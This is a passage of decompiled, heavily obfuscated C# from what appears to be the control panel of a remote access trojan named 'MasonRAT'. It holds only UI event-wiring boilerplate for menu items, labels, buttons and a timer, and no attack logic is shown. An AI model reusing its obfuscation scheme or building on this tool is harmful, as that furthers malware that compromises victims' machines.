      this.\u2694️MasonRAT\u270Cـط̍څ\u060Cٽـ\u060B\u0609\u060A\u060Aڙحاٺْ\u060C\u060A = value;
      ToolStripMenuItem masonRatـط̍څٽـڙحاٺْ2 = this.\u2694️MasonRAT\u270Cـط̍څ\u060Cٽـ\u060B\u0609\u060A\u060Aڙحاٺْ\u060C\u060A;
      if (masonRatـط̍څٽـڙحاٺْ2 == null)
        return;
      masonRatـط̍څٽـڙحاٺْ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـڙڝبــڝ\u060Dـٺ\u060E̍ـ
  {
    get => this.\u2694️MasonRAT\u270Cـ\u060A\u0020ۡ\u0609ٽٻٺڙحۙــڠټب;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڙ\u060A\u060Cڦـ\u060Fٺڝىژڙ\u0608\u060Aـ\u0608\u0608ـۏﻋ\u0608);
      ToolStripMenuItem ratـۡٽٻٺڙحۙــڠټب1 = this.\u2694️MasonRAT\u270Cـ\u060A\u0020ۡ\u0609ٽٻٺڙحۙــڠټب;
      if (ratـۡٽٻٺڙحۙــڠټب1 != null)
        ratـۡٽٻٺڙحۙــڠټب1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـ\u060A\u0020ۡ\u0609ٽٻٺڙحۙــڠټب = value;
      ToolStripMenuItem ratـۡٽٻٺڙحۙــڠټب2 = this.\u2694️MasonRAT\u270Cـ\u060A\u0020ۡ\u0609ٽٻٺڙحۙــڠټب;
      if (ratـۡٽٻٺڙحۙــڠټب2 == null)
        return;
      ratـۡٽٻٺڙحۙــڠټب2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cٽـڦﻻـ\u0609ژ\u060Eـ\u060A\u060C\u060B
  {
    get => this.\u2694️MasonRAT\u270Cﻼ\u0608ــطـڕۙڛڙ\u060A;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـٸ\u060A̍مد\u0609ڙــ\u060Aـــ̍ـ);
      ToolStripMenuItem masonRatﻼــطـڕۙڛڙ1 = this.\u2694️MasonRAT\u270Cﻼ\u0608ــطـڕۙڛڙ\u060A;
      if (masonRatﻼــطـڕۙڛڙ1 != null)
        masonRatﻼــطـڕۙڛڙ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cﻼ\u0608ــطـڕۙڛڙ\u060A = value;
      ToolStripMenuItem masonRatﻼــطـڕۙڛڙ2 = this.\u2694️MasonRAT\u270Cﻼ\u0608ــطـڕۙڛڙ\u060A;
      if (masonRatﻼــطـڕۙڛڙ2 == null)
        return;
      masonRatﻼــطـڕۙڛڙ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ\u060Aـ\u060Dڼ\u060Fۧ̍\u060Fۙ\u060Bﻻۡڼ
  {
    get => this.\u2694️MasonRAT\u270Cڙ\u060Fڙ\u0608ـۜۧۡ\u060Dـڙ\u060Bﻻـﻻ\u060Aۡـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـڜ\u060F̍بﯧڞــ\u060C);
      ToolStripMenuItem ratڙڙـۜۧۡـڙﻻـﻻۡـ1 = this.\u2694️MasonRAT\u270Cڙ\u060Fڙ\u0608ـۜۧۡ\u060Dـڙ\u060Bﻻـﻻ\u060Aۡـ;
      if (ratڙڙـۜۧۡـڙﻻـﻻۡـ1 != null)
        ratڙڙـۜۧۡـڙﻻـﻻۡـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڙ\u060Fڙ\u0608ـۜۧۡ\u060Dـڙ\u060Bﻻـﻻ\u060Aۡـ = value;
      ToolStripMenuItem ratڙڙـۜۧۡـڙﻻـﻻۡـ2 = this.\u2694️MasonRAT\u270Cڙ\u060Fڙ\u0608ـۜۧۡ\u060Dـڙ\u060Bﻻـﻻ\u060Aۡـ;
      if (ratڙڙـۜۧۡـڙﻻـﻻۡـ2 == null)
        return;
      ratڙڙـۜۧۡـڙﻻـﻻۡـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cۙٻـ\u060Eڅٺاٽـب\u060Dب
  {
    get => this.\u2694️MasonRAT\u270Cـ\u060D̍\u0609\u060Cـ\u0608\u060Dـ\u0608ـۧڦټۛ\u0608ڞ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0609ٺـڙـﮪۚ\u0609ؤْ\u0608ـڙڙ\u0609);
      ToolStripMenuItem masonRatـ̍ـــۧڦټۛڞ1 = this.\u2694️MasonRAT\u270Cـ\u060D̍\u0609\u060Cـ\u0608\u060Dـ\u0608ـۧڦټۛ\u0608ڞ;
      if (masonRatـ̍ـــۧڦټۛڞ1 != null)
        masonRatـ̍ـــۧڦټۛڞ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـ\u060D̍\u0609\u060Cـ\u0608\u060Dـ\u0608ـۧڦټۛ\u0608ڞ = value;
      ToolStripMenuItem masonRatـ̍ـــۧڦټۛڞ2 = this.\u2694️MasonRAT\u270Cـ\u060D̍\u0609\u060Cـ\u0608\u060Dـ\u0608ـۧڦټۛ\u0608ڞ;
      if (masonRatـ̍ـــۧڦټۛڞ2 == null)
        return;
      masonRatـ̍ـــۧڦټۛڞ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cٽۏ\u0608ٻۜـط\u0608\u0020ڙْٺـءـح
  {
    get => this.\u2694️MasonRAT\u270Cـ\u060B\u060Dﮪى\u0609\u060E\u060Cۙ̍ڙ\u0608ۜ\u060Fڟــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Aڝـּ\u060Dـــ\u060Cﻻ);
      ToolStripMenuItem masonRatـﮪىۙ̍ڙۜڟــ1 = this.\u2694️MasonRAT\u270Cـ\u060B\u060Dﮪى\u0609\u060E\u060Cۙ̍ڙ\u0608ۜ\u060Fڟــ;
      if (masonRatـﮪىۙ̍ڙۜڟــ1 != null)
        masonRatـﮪىۙ̍ڙۜڟــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـ\u060B\u060Dﮪى\u0609\u060E\u060Cۙ̍ڙ\u0608ۜ\u060Fڟــ = value;
      ToolStripMenuItem masonRatـﮪىۙ̍ڙۜڟــ2 = this.\u2694️MasonRAT\u270Cـ\u060B\u060Dﮪى\u0609\u060E\u060Cۙ̍ڙ\u0608ۜ\u060Fڟــ;
      if (masonRatـﮪىۙ̍ڙۜڟــ2 == null)
        return;
      masonRatـﮪىۙ̍ڙۜڟــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Bدحﯧـبـۛىڛد\u0609ڙؤ
  {
    get => this.\u2694️MasonRAT\u270C\u060Dڙ\u060Eحـم\u0609̨ـ\u060Dب\u060Bټﻋـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Aـٺد\u060Aټـ\u0609ټٺ\u060Eڝ\u060Dـژةــ\u060E\u060D);
      ToolStripMenuItem masonRatڙحـم̨ـبټﻋـ1 = this.\u2694️MasonRAT\u270C\u060Dڙ\u060Eحـم\u0609̨ـ\u060Dب\u060Bټﻋـ;
      if (masonRatڙحـم̨ـبټﻋـ1 != null)
        masonRatڙحـم̨ـبټﻋـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Dڙ\u060Eحـم\u0609̨ـ\u060Dب\u060Bټﻋـ = value;
      ToolStripMenuItem masonRatڙحـم̨ـبټﻋـ2 = this.\u2694️MasonRAT\u270C\u060Dڙ\u060Eحـم\u0609̨ـ\u060Dب\u060Bټﻋـ;
      if (masonRatڙحـم̨ـبټﻋـ2 == null)
        return;
      masonRatڙحـم̨ـبټﻋـ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("ToolStripMenuItem56")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ\u060Aـٻـ\u0608ـڛ\u0609\u060F\u0608ټ\u0608ــ\u060D { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ\u060Eـــڙ\u0609ڙـ\u0608ۛـּ\u0609
  {
    get => this.\u2694️MasonRAT\u270Cـ\u060Dۡ\u060Eـڙ\u0020\u060Dـڙ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Dـ\u0608\u060B\u0608\u060Eڞـٺـ\u0609ـڅـ);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270Cـ\u060Dۡ\u060Eـڙ\u0020\u060Dـڙ;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـ\u060Dۡ\u060Eـڙ\u0020\u060Dـڙ = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270Cـ\u060Dۡ\u060Eـڙ\u0020\u060Dـڙ;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڝ\u060A\u060Bڜـ\u060Bـڦڕ\u0609ــ\u060Aـڅ\u060F\u0609ٻ
  {
    get => this.\u2694️MasonRAT\u270C\u0609\u060Aـټ̍ـ\u060B\u0609\u060Aــ\u0609ـٸ\u060A;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u0608ټۨـڙـٸ\u0609ؤ\u060Eڅْٺ\u060Fڙ\u0609);
      ToolStripMenuItem masonRatـټ̍ــــٸ1 = this.\u2694️MasonRAT\u270C\u0609\u060Aـټ̍ـ\u060B\u0609\u060Aــ\u0609ـٸ\u060A;
      if (masonRatـټ̍ــــٸ1 != null)
        masonRatـټ̍ــــٸ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0609\u060Aـټ̍ـ\u060B\u0609\u060Aــ\u0609ـٸ\u060A = value;
      ToolStripMenuItem masonRatـټ̍ــــٸ2 = this.\u2694️MasonRAT\u270C\u0609\u060Aـټ̍ـ\u060B\u0609\u060Aــ\u0609ـٸ\u060A;
      if (masonRatـټ̍ــــٸ2 == null)
        return;
      masonRatـټ̍ــــٸ2.Click += eventHandler;
    }
  }

  internal virtual Guna2GradientButton \u2694️MasonRAT\u270Cـٺ\u060E\u0609\u060A\u060Bـ\u060A\u060C\u060Bۧط\u060Aڙ
  {
    get => this.\u2694️MasonRAT\u270C\u0608\u060Cى\u060Eؤ\u060Dــطبـد\u060B\u0609;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cۭۧ\u0609ﻻۡ\u0608دـژ\u0609حټــټ);
      Guna2GradientButton masonRatىؤــطبـد1 = this.\u2694️MasonRAT\u270C\u0608\u060Cى\u060Eؤ\u060Dــطبـد\u060B\u0609;
      if (masonRatىؤــطبـد1 != null)
        masonRatىؤــطبـد1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0608\u060Cى\u060Eؤ\u060Dــطبـد\u060B\u0609 = value;
      Guna2GradientButton masonRatىؤــطبـد2 = this.\u2694️MasonRAT\u270C\u0608\u060Cى\u060Eؤ\u060Dــطبـد\u060B\u0609;
      if (masonRatىؤــطبـد2 == null)
        return;
      masonRatىؤــطبـد2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("TabPage5")]
  internal virtual TabPage \u2694️MasonRAT\u270Cٺڙۚـټـڙـدٺۡـ̨ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Guna2CustomGradientPanel \u2694️MasonRAT\u270C\u060A̍ــﮪـ̍\u0608\u0609\u060Cـ\u0608\u0608ـڦ
  {
    get => this.\u2694️MasonRAT\u270Cٺڜئةـۨۙۙـڅۛ\u0609\u060Dـڙ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      PaintEventHandler paintEventHandler = new PaintEventHandler(this.\u2694️MasonRAT\u270C\u060Aــڅۡ\u0609\u0609\u060Aټڙ);
      Guna2CustomGradientPanel ratٺڜئةـۨۙۙـڅۛـڙ1 = this.\u2694️MasonRAT\u270Cٺڜئةـۨۙۙـڅۛ\u0609\u060Dـڙ;
      if (ratٺڜئةـۨۙۙـڅۛـڙ1 != null)
        ratٺڜئةـۨۙۙـڅۛـڙ1.Paint -= paintEventHandler;
      this.\u2694️MasonRAT\u270Cٺڜئةـۨۙۙـڅۛ\u0609\u060Dـڙ = value;
      Guna2CustomGradientPanel ratٺڜئةـۨۙۙـڅۛـڙ2 = this.\u2694️MasonRAT\u270Cٺڜئةـۨۙۙـڅۛ\u0609\u060Dـڙ;
      if (ratٺڜئةـۨۙۙـڅۛـڙ2 == null)
        return;
      ratٺڜئةـۨۙۙـڅۛـڙ2.Paint += paintEventHandler;
    }
  }

  internal virtual Guna2GroupBox \u2694️MasonRAT\u270Cڦــ\u0608\u0608\u060D\u0020طڠ\u0609\u060D
  {
    get => this.\u2694️MasonRAT\u270C\u060A\u060Aْـٸ\u060Dـﻋﻋ\u0608\u060Aـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cح\u060A\u0609ﮪبـۡ\u060B\u0020\u060Aدڞء);
      Guna2GroupBox guna2GroupBox1 = this.\u2694️MasonRAT\u270C\u060A\u060Aْـٸ\u060Dـﻋﻋ\u0608\u060Aـ;
      if (guna2GroupBox1 != null)
        guna2GroupBox1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060A\u060Aْـٸ\u060Dـﻋﻋ\u0608\u060Aـ = value;
      Guna2GroupBox guna2GroupBox2 = this.\u2694️MasonRAT\u270C\u060A\u060Aْـٸ\u060Dـﻋﻋ\u0608\u060Aـ;
      if (guna2GroupBox2 == null)
        return;
      guna2GroupBox2.Click += eventHandler;
    }
  }

  internal virtual System.Windows.Forms.Timer \u2694️MasonRAT\u270Cـــۚۙب\u0020ڙؤڙﻋ
  {
    get => this.\u2694️MasonRAT\u270Cـ\u060Dْڠ\u0609حـ\u0609\u0609ڙ\u060A;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڕبـۛـ\u0609\u060Dּـڟ\u060Aۭۡﻻڙﻋـ\u0020\u060Dـ);
      System.Windows.Forms.Timer timer1 = this.\u2694️MasonRAT\u270Cـ\u060Dْڠ\u0609حـ\u0609\u0609ڙ\u060A;
      if (timer1 != null)
        timer1.Tick -= eventHandler;
      this.\u2694️MasonRAT\u270Cـ\u060Dْڠ\u0609حـ\u0609\u0609ڙ\u060A = value;
      System.Windows.Forms.Timer timer2 = this.\u2694️MasonRAT\u270Cـ\u060Dْڠ\u0609حـ\u0609\u0609ڙ\u060A;
      if (timer2 == null)
        return;
      timer2.Tick += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Label7")]
  internal virtual Label \u2694️MasonRAT\u270Cـۡ\u060Aب\u0609ּ\u060Dؤۡڕٻـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Label \u2694️MasonRAT\u270C\u0020ۡټڙڙ\u060Aـــٻڛۨ
  {
    get => this.\u2694️MasonRAT\u270Cـ\u060Aط\u060F\u0608ٽ\u060C\u060D\u060Cﻻؤ\u060A\u0020;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cــڙۙۧڜــۙـ\u0609ـ\u060F);
      Label label1 = this.\u2694️MasonRAT\u270Cـ\u060Aط\u060F\u0608ٽ\u060C\u060D\u060Cﻻؤ\u060A\u0020;
      if (label1 != null)
        label1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـ\u060Aط\u060F\u0608ٽ\u060C\u060D\u060Cﻻؤ\u060A\u0020 = value;
      Label label2 = this.\u2694️MasonRAT\u270Cـ\u060Aط\u060F\u0608ٽ\u060C\u060D\u060Cﻻؤ\u060A\u0020;
      if (label2 == null)
        return;
      label2.Click += eventHandler;
    }
  }

  internal virtual Label \u2694️MasonRAT\u270Cـۧئ\u0608ڜــڙۚءڙ\u060Fى̍ۡۨژمٺ
  {
    get => this.\u2694️MasonRAT\u270Cــ\u060B\u0609ټڕـگ\u060A\u060Bٺۛٸ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cۨـ\u060F\u060Fژٽ\u0608\u0609ڝؤ);
      Label masonRatــټڕـگٺۛٸ1 = this.\u2694️MasonRAT\u270Cــ\u060B\u0609ټڕـگ\u060A\u060Bٺۛٸ;
      if (masonRatــټڕـگٺۛٸ1 != null)
        masonRatــټڕـگٺۛٸ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cــ\u060B\u0609ټڕـگ\u060A\u060Bٺۛٸ = value;
      Label masonRatــټڕـگٺۛٸ2 = this.\u2694️MasonRAT\u270Cــ\u060B\u0609ټڕـگ\u060A\u060Bٺۛٸ;
      if (masonRatــټڕـگٺۛٸ2 == null)
        return;
      masonRatــټڕـگٺۛٸ2.Click += eventHandler;
    }
  }

  internal virtual Guna2GroupBox \u2694️MasonRAT\u270C\u060Aد\u060Bٺ\u0608ـּۡةـﻼﻋ\u0608\u0608ـۏ\u060Dڞٺ
  {
    get => this.\u2694️MasonRAT\u270Cﮪﻻ\u060Dـ\u060Aټمـ\u0609\u060A\u060D̍\u060Aــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـټبﻻ\u0020ڕۙ\u060D\u060Eئڟ);
      Guna2GroupBox masonRatﮪﻻـټمـ̍ــ1 = this.\u2694️MasonRAT\u270Cﮪﻻ\u060Dـ\u060Aټمـ\u0609\u060A\u060D̍\u060Aــ;
      if (masonRatﮪﻻـټمـ̍ــ1 != null)
        masonRatﮪﻻـټمـ̍ــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cﮪﻻ\u060Dـ\u060Aټمـ\u0609\u060A\u060D̍\u060Aــ = value;
      Guna2GroupBox masonRatﮪﻻـټمـ̍ــ2 = this.\u2694️MasonRAT\u270Cﮪﻻ\u060Dـ\u060Aټمـ\u0609\u060A\u060D̍\u060Aــ;
      if (masonRatﮪﻻـټمـ̍ــ2 == null)
        return;
      masonRatﮪﻻـټمـ̍ــ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("PictureBox2")]
  internal virtual PictureBox \u2694️MasonRAT\u270C\u060C\u0608ـ̨\u060Cدـؤد\u060Dٺ\u060Fڞـىژـۛؤؤ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Label3")]
  internal virtual Label \u2694️MasonRAT\u270C\u060Fدم\u060Bٻڝـ\u060Dڙٺــ\u060D\u060F\u060E { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Label \u2694️MasonRAT\u270Cـ\u060Aﻋؤ\u060E\u060Fحٺـۚ\u0609ڦﻼـ
  {
    get => this.\u2694️MasonRAT\u270C\u060Aـءڠ\u060Eـ\u060D\u0609\u060D\u0609ڦ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cمـ̍\u060Dـــڼـ\u060A\u060Dۡ\u060B\u0608ىــټ\u0609);
      Label label1 = this.\u2694️MasonRAT\u270C\u060Aـءڠ\u060Eـ\u060D\u0609\u060D\u0609ڦ;
      if (label1 != null)
        label1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Aـءڠ\u060Eـ\u060D\u0609\u060D\u0609ڦ = value;
      Label label2 = this.\u2694️MasonRAT\u270C\u060Aـءڠ\u060Eـ\u060D\u0609\u060D\u0609ڦ;
      if (label2 == null)
        return;
      label2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Guna2GroupBox4")]
  internal virtual Guna2GroupBox \u2694️MasonRAT\u270Cڞ\u060Aڇىـۏۭءد̍ــ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("PictureBox3")]
  internal virtual PictureBox \u2694️MasonRAT\u270Cــڙּــ\u0609ــؤﻋٺط { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Label5")]
  internal virtual Label \u2694️MasonRAT\u270C̍د\u060Eڦۧ\u0020ڦ\u060A\u0609ا\u060Fـۧـٽٸ\u0609 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Label \u2694️MasonRAT\u270Cۨﯧـۚحﮪڟٽـﮪـ\u060A\u0608ـ\u060A\u060Aּ
  {
    get => this.\u2694️MasonRAT\u270Cةـــۧدـ\u0609ټ\u060Aـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060D\u0608\u0609\u060Dگم\u060Fـٺۭټٺـ);
      Label masonRatةـــۧدـټـ1 = this.\u2694️MasonRAT\u270Cةـــۧدـ\u0609ټ\u060Aـ;
      if (masonRatةـــۧدـټـ1 != null)
        masonRatةـــۧدـټـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cةـــۧدـ\u0609ټ\u060Aـ = value;
      Label masonRatةـــۧدـټـ2 = this.\u2694️MasonRAT\u270Cةـــۧدـ\u0609ټ\u060Aـ;
      if (masonRatةـــۧدـټـ2 == null)
        return;
      masonRatةـــۧدـټـ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Guna2GroupBox6")]
  internal virtual Guna2GroupBox \u2694️MasonRAT\u270Cڠـﻻڼ\u0609ــٸـ\u0609ـ\u060Fۙۧۙـۭ\u0608\u060A { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("PictureBox5")]
  internal virtual PictureBox \u2694️MasonRAT\u270Cڣۧـــٺـ\u0609ژ̨ﻼئ\u0609 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Label11")]
  internal virtual Label \u2694️MasonRAT\u270Cبﻻ\u0608\u060Bـ\u0608ا\u060Aــﻻ\u060Fح\u060A { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Label \u2694️MasonRAT\u270Cـ\u060Dۙـۡــ\u060D\u060F\u060C\u0608̍ـڛ
  {
    get => this.\u2694️MasonRAT\u270C\u0608ٽــ\u060Aڜٽﻻﻻڇـۛﻻٸ̍ـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Aڙټٺ\u060Cحـﻋـ\u060Dﻻۧ\u060D);
      Label ratٽــڜٽﻻﻻڇـۛﻻٸ̍ـ1 = this.\u2694️MasonRAT\u270C\u0608ٽــ\u060Aڜٽﻻﻻڇـۛﻻٸ̍ـ;
      if (ratٽــڜٽﻻﻻڇـۛﻻٸ̍ـ1 != null)
        ratٽــڜٽﻻﻻڇـۛﻻٸ̍ـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0608ٽــ\u060Aڜٽﻻﻻڇـۛﻻٸ̍ـ = value;
      Label ratٽــڜٽﻻﻻڇـۛﻻٸ̍ـ2 = this.\u2694️MasonRAT\u270C\u0608ٽــ\u060Aڜٽﻻﻻڇـۛﻻٸ̍ـ;
      if (ratٽــڜٽﻻﻻڇـۛﻻٸ̍ـ2 == null)
        return;
      ratٽــڜٽﻻﻻڇـۛﻻٸ̍ـ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Guna2GroupBox5")]
  internal virtual Guna2GroupBox \u2694️MasonRAT\u270Cـٺ\u060D\u060A\u0609\u0608ـمـ\u060Aﻼ\u060E\u060D\u060Aـڅڙـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("PictureBox4")]
  internal virtual PictureBox \u2694️MasonRAT\u270Cڦ؁ژ̍ۧ̍\u0609اب\u060Dـڦڙىڙ\u060B { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Label9")]
  internal virtual Label \u2694️MasonRAT\u270C\u0020گد\u060D̨\u060D\u060Dۛ\u060Cـ\u0020\u0609ۜى\u0609\u060D\u060B\u060A { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Label \u2694️MasonRAT\u270Cּ\u0608ـﻋ\u060Dـ\u0609ۏ\u060Cۏحۡۙۙ\u060Aگڜبـڼ
  {
    get => this.\u2694️MasonRAT\u270C\u0608ڙـة\u0609څۜۧٺ\u060Aد\u060F\u060Dىح\u060D;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Aڕۏۡ\u0608ـْۙڙ\u060F);
      Label masonRatڙـةڅۜۧٺدىح1 = this.\u2694️MasonRAT\u270C\u0608ڙـة\u0609څۜۧٺ\u060Aد\u060F\u060Dىح\u060D;
      if (masonRatڙـةڅۜۧٺدىح1 != null)
        masonRatڙـةڅۜۧٺدىح1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0608ڙـة\u0609څۜۧٺ\u060Aد\u060F\u060Dىح\u060D = value;
      Label masonRatڙـةڅۜۧٺدىح2 = this.\u2694️MasonRAT\u270C\u0608ڙـة\u0609څۜۧٺ\u060Aد\u060F\u060Dىح\u060D;
      if (masonRatڙـةڅۜۧٺدىح2 == null)
        return;
      masonRatڙـةڅۜۧٺدىح2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Guna2GroupBox7")]
  internal virtual Guna2GroupBox \u2694️MasonRAT\u270Cـ\u060Bطڅ\u060E\u060D\u0609ڙـ\u0608\u0608بڙـءڙ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Label \u2694️MasonRAT\u270Cۜ\u060Bــڙ\u060Fڇ\u0609\u060A\u060Eۧ\u060B
  {
    get => this.\u2694️MasonRAT\u270C\u060Cــ\u060Aﮪد\u060Bـطڙـدـڙـڦڙ\u060Bڙٽ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060C\u060Aٸاڛــ\u0608\u060D\u0608\u060Dڙ\u060Eۚـ\u060Dۏ\u0608ـ);
      Label ــﮪدـطڙـدـڙـڦڙڙٽ1 = this.\u2694️MasonRAT\u270C\u060Cــ\u060Aﮪد\u060Bـطڙـدـڙـڦڙ\u060Bڙٽ;
      if (ــﮪدـطڙـدـڙـڦڙڙٽ1 != null)
        ــﮪدـطڙـدـڙـڦڙڙٽ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Cــ\u060Aﮪد\u060Bـطڙـدـڙـڦڙ\u060Bڙٽ = value;
      Label ــﮪدـطڙـدـڙـڦڙڙٽ2 = this.\u2694️MasonRAT\u270C\u060Cــ\u060Aﮪد\u060Bـطڙـدـڙـڦڙ\u060Bڙٽ;
      if (ــﮪدـطڙـدـڙـڦڙڙٽ2 == null)
        return;
      ــﮪدـطڙـدـڙـڦڙڙٽ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("Guna2Separator1")]
  internal virtual Guna2Separator \u2694️MasonRAT\u270Cْﻋـــ\u0608\u060Eڙ\u060Fۚگـٺــ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Label15")]
  internal virtual Label \u2694️MasonRAT\u270Cڟـــ\u060D\u060Dـ̨\u060Dـڙڙـ\u0608ـ̨\u060E\u0609ـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Guna2Separator4")]
  internal virtual Guna2Separator \u2694️MasonRAT\u270C\u0609ۧ\u060Bۭټ\u060Dـدٸ\u060Eــ\u0608 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("Label16")]
  internal virtual Label \u2694️MasonRAT\u270Cٸمٸڜٸ\u060Dـۡڣ\u060D { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Label \u2694️MasonRAT\u270Cټْ\u0609̍\u060Dــ\u060A\u060Bٺ\u0609
  {
    get => this.\u2694️MasonRAT\u270C\u060Fٸ\u0608د\u0609ـ\u060Aــ\u060F;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Fـ\u060Fــ\u060D\u0609ڇٺ\u060Bحﻻ\u060Aــــ\u060A);
      Label label1 = this.\u2694️MasonRAT\u270C\u060Fٸ\u0608د\u0609ـ\u060Aــ\u060F;
      if (label1 != null)
        label1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Fٸ\u0608د\u0609ـ\u060Aــ\u060F = value;
      Label label2 = this.\u2694️MasonRAT\u270C\u060Fٸ\u0608د\u0609ـ\u060Aــ\u060F;
      if (label2 == null)
        return;
      label2.Click += eventHandler;
    }
  }

